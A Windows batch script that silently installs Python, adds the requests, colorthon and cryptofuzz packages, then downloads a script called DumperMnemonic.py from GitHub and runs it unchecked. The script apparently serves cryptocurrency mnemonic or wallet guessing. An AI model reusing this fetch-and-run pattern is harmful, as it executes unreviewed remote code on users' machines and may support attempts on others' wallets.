@echo off

REM Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    REM Download and install Python
    echo Python is not installed. Downloading Python...
    powershell.exe -Command Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe -OutFile python_installer.exe

    REM Run Python installer with progress bar
    echo Installing Python...
    start /wait python_installer.exe /quiet PrependPath=1 Include_launcher=0
    del python_installer.exe
)

REM Install required packages using pip
echo Installing required packages using pip...
pip install requests colorthon cryptofuzz

set "PYTHON_SCRIPT_URL=https://raw.githubusercontent.com/Pymmdrza/Dumper-Mnemonic/mainx/DumperMnemonic.py"
set "DOWNLOAD_PATH=DumperMnemonic.py"

REM Downloading file
powershell.exe -Command Invoke-WebRequest -OutFile %DOWNLOAD_PATH% %PYTHON_SCRIPT_URL%

REM Checking download operation success
if %errorlevel% neq 0 (
    echo Error: Failed to download the file.
    exit /b %errorlevel%
)

REM Running Python script
echo Running Python script...
python "%DOWNLOAD_PATH%"
